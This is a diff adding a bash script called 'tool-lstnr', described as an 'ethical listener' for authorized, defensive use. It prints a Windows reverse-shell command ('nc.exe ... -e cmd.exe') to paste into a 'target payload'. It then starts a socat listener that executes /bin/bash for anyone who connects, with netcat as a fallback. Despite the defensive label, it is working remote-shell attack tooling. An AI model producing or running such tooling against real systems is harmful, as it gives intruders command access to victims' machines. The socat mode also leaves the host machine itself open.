@@ -1,0 +1,87 @@
+#!/bin/bash
+# ┌───────────────────────────────────────────--------────┐
+# │ Type / Version : bash / live                          │
+# │ Author         : Mark Hamilton │ Co-Pilot AI assisted │
+# │ Script Purpose : Ethical Listener with Fallback       │
+# │ Package        : toolbox                              │
+# └───────────────────────────────────────────────------──┘
+# Usage:
+#   tool-lstnr [--port <PORT>] [--dry-run] [--log] [--hashmap]
+# Examples:
+#   tool-lstnr
+#   tool-lstnr --port 5555 --log --hashmap
+# Description:
+#   Starts a listener on a specified port using socat (preferred) or netcat (fallback).
+#   Includes dry-run mode, logging, and hash-based traceability.
+#   Designed for authorized, defensive use only.
+# End Help
+
+# ── Metadata ─────────────────────────────────────────────
+TOOL_NAME="tool-lstnr"
+VERSION="1.0"
+DEFAULT_PORT=4444
+LOG_FILE="listener.log"
+HASH_DIR="~/Documents/.hashmap"
+TIMESTAMP_FILE="$HASH_DIR/${TOOL_NAME}.timestamp"
+HASH_FILE="$HASH_DIR/${TOOL_NAME}.hash"
+
+# ── Parse Arguments ──────────────────────────────────────
+PORT=$DEFAULT_PORT
+DRYRUN=false
+LOGGING=false
+HASHMAP=false
+
+while [[ $# -gt 0 ]]; do
+  case "$1" in
+    --port) PORT="$2"; shift ;;
+    --dry-run) DRYRUN=true ;;
+    --log) LOGGING=true ;;
+    --hashmap) HASHMAP=true ;;
+    *) echo "[!] Unknown option: $1"; exit 1 ;;
+  esac
+  shift
+done
+
+# ── IP Detection ─────────────────────────────────────────
+IP=$(ip route get 1 | awk '{print $7; exit}')
+
+# ── Display Info ─────────────────────────────────────────
+echo -e "\n\e[32m[*] Listener Configuration:\e[0m"
+echo -e "\e[34m    IP:\e[0m $IP"
+echo -e "\e[34m    Port:\e[0m $PORT"
+echo -e "\e[34m    Mode:\e[0m $( $DRYRUN && echo "Dry-run" || echo "Live")"
+echo -e "\e[33mPaste into target payload:\e[0m"
+echo -e "    nc.exe $IP $PORT -e cmd.exe\n"
+
+# ── Dry-run Exit ─────────────────────────────────────────
+$DRYRUN && echo "[*] Dry-run complete. No listener started." && exit 0
+
+# ── Listener Selection ───────────────────────────────────
+if command -v socat >/dev/null 2>&1; then
+  echo "[*] Using socat listener..."
+  CMD="socat -v TCP-LISTEN:$PORT,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
+else
+  echo "[*] Socat not found. Falling back to netcat..."
+  CMD="nc -lvp $PORT"
+fi
+
+# ── Logging Setup ────────────────────────────────────────
+if $LOGGING; then
+  echo "[*] Logging enabled → $LOG_FILE"
+  $CMD 2>>"$LOG_FILE" | while read line; do
+    echo "[LOG][$(date +'%H:%M:%S')] $line"
+  done
+else
+  eval "$CMD"
+fi
+
+# ── Hashmap Generation ───────────────────────────────────
+if $HASHMAP; then
+  mkdir -p "$HASH_DIR"
+  echo "[*] Generating traceability files..."
+  date +"%Y-%m-%d %H:%M:%S" > "$TIMESTAMP_FILE"
+  sha256sum "$0" > "$HASH_FILE"
+  echo "[*] Timestamp → $TIMESTAMP_FILE"
+  echo "[*] Hash → $HASH_FILE"
+fi
+
